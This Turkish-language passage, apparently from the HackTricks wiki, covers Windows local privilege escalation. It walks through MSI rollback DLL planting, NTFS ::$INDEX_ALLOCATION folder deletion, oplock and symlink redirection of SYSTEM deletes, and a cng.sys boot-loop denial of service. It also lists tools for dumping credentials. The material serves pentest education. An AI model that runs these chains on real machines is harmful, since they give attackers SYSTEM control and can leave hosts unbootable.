        - `.rbf` dosyanızı (kötü amaçlı DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yükleyin.
    - **Kötü amaçlı SYSTEM düzeyinde payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback işlemini tetikleyin
    - Installer’ın devam etmesi için senkronizasyon event’ini sinyallendirin.
    - **type 19 custom action (`ErrorOut`)**, yüklemeyi bilinen bir noktada **kasıtlı olarak başarısız kılacak** şekilde yapılandırılmıştır.
    - Bu, **rollback işlemini başlatır**.

- Adım 13: SYSTEM DLL’inizi yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL’inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path’te kötü amaçlı DLL’iniz** vardır.

- Son adım: SYSTEM kodunu çalıştırın
    - Hijack ettiğiniz DLL’i yükleyen, güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
    - **İşte bu kadar**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename işleminden SYSTEM EoP’ye

Ana MSI rollback tekniği (bir önceki teknik), **tam bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya güvenlik açığınız yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**’ı istismar edebilirsiniz: her klasörün şu adlı gizli bir alternate data stream’i vardır:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **index metadata** bilgilerini depolar.

Dolayısıyla, bir klasörün `::$INDEX_ALLOCATION` stream'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API'sini çağırıyor olsanız da **klasörün kendisini siler**.

### Klasör İçeriğini Silmekten SYSTEM EoP'ye
Primitive'iniz rastgele file/folder'ları silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir folder'ın *içeriğini* silmenize izin veriyorsa** ne olur?

1. Step 1: Yem klasörü ve file oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerinde bir **oplock** ayarlayın
- Privileged bir process `file1.txt`'i silmeye çalıştığında oplock **execution'ı duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. 3. Adım: SYSTEM process'i tetikle (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize aktarır.

4. 4. Adım: Oplock callback içinde — silme işlemini yönlendir

- Seçenek A: `file1.txt` dosyasını başka bir yere taşı
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i zamanından önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştür:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: `\RPC Control` içinde bir **symlink** oluştur:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedefler; bu akışı silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi junction + symlink nedeniyle aslında şunu siler:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Bir Klasör Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak rastgele bir klasör oluşturmanıza** olanak tanıyan bir primitive'i exploit edin — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows sürücüsünün** adını taşıyan bir **klasör** oluşturun (dosya değil); örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode sürücüsüne karşılık gelir.
- Önceden **klasör olarak oluşturursanız**, Windows açılışta gerçek sürücüyü yükleyemez.
- Ardından Windows, açılış sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü bulamaz** ve **çöker veya açılışı durdurur**.
- **Geri dönüş seçeneği yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı log/backup yollarından ve OM symlink'lerinden keyfi dosya üzerine yazma / boot DoS'a

Bir **ayrıcalıklı servis**, **yazılabilir bir config** dosyasından okuduğu bir yola log/export yazdığında, bu yolu **Object Manager symlink'leri + NTFS mount point'leri** ile yönlendirerek ayrıcalıklı yazma işlemini keyfi dosya üzerine yazmaya dönüştürebilirsiniz (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu saklayan config, saldırgan tarafından yazılabilir olmalıdır (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` yoluna bir mount point ve bir OM dosya symlink'i oluşturabilme olanağı (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, export, rapor).

**Örnek zincir**
1. Ayrıcalıklı log hedefini bulmak için config dosyasını okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` dosyasındaki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. yöneticinin "test SMS'i gönder" işlemini başlatması). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un değiştirilmiş sürücü yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir servisin yazma amacıyla açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopyası varsa önce bu kopya denenebilir ve bozuk veriler için güvenilir bir DoS hedefi oluşturabilir.



## **High Integrity'den System'e**

### **Yeni servis**

Zaten bir High Integrity process içinde çalışıyorsanız, **SYSTEM'e giden yol** yeni bir servis **oluşturup çalıştırmakla** kolayca açılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry kayıtlarını etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili registry key'leri ve bir _.msi_ paketinin nasıl yükleneceği hakkında daha fazla bilgiye buradan ulaşabilirsiniz.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token privileges'a

Bu token privileges'lara sahipseniz (muhtemelen bunları zaten High Integrity olan bir process'te bulursunuz), SeDebug privilege'ını kullanarak (korumalı process'ler dışındaki) **neredeyse her process'i açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token privileges'larına sahip SYSTEM olarak çalışan bir process seçmek için kullanılır** (_evet, tüm token privileges'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde privilege escalation yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Pipe'ı **`SeImpersonate`** privilege'ını kullanarak oluşturan **server**, pipe client'ının (service) **token'ını taklit ederek** SYSTEM privileges elde edebilir.\
[name pipes hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun.](#named-pipe-client-impersonation)\
[name pipes kullanarak high integrity'den System'e geçişin bir örneğini okumak istiyorsanız bunu okuyun.](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'yi **hijack** edebilirseniz, bu izinlerle istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır. Ayrıca, dll'leri yüklemek için kullanılan klasörlerde **yazma izinlerine** sahip olacağından, bu yöntemi **High Integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiye** [**buradan ulaşabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tam privileges'a

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vektörlerini bulmak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Yerel kullanımda -Thorough seçeneğini kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credentials çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde dener**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc güvenlik açıklarını arar (Watson nedeniyle KULLANIMDAN KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc güvenlik açıklarını arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u tarar (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan credentials çıkarır (github'da önceden derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable). Önerilmez. Win10'da düzgün çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da düzgün çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu yazıya dayanarak oluşturulmuş araç (düzgün çalışması için accesschk gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Yetki Yükseltmenin Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Yetki Yükseltme - başvuru kılavuzu](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Eksiksiz OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows Yetki Yükseltme kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows Yetki Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi-Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Bağlantı. Windows'ta Symbolic Link'leri Kötüye Kullanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Güven Tuzağı: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi zorluklarının çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hizmet ikili dosyalarını ele geçirme](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine Hükmedecek Tek I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Keyfi Dosya Silme İşlemlerini Kötüye Kullanarak Yetki Yükseltme ve Diğer Harika Yöntemler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları 2. Bölüm: CVE-2020-1013, Windows 10 için Yerel Yetki Yükseltme 1-Day Açığı](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Bir Görüntü Değişikliğinin Yetki Yükseltmeye Yol Açması](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Özel Anahtarlarını Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – 1. Bölüm](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürme (0_o) – 2. Bölüm](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer Klasörünü Silerek Yetki Yükseltme](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEM'e Geri Dönüş Adımlarınızı İzleme](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Services paylaşımlı bellek offset'leriyle ilgili yetki yükseltme güvenlik önerisi](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
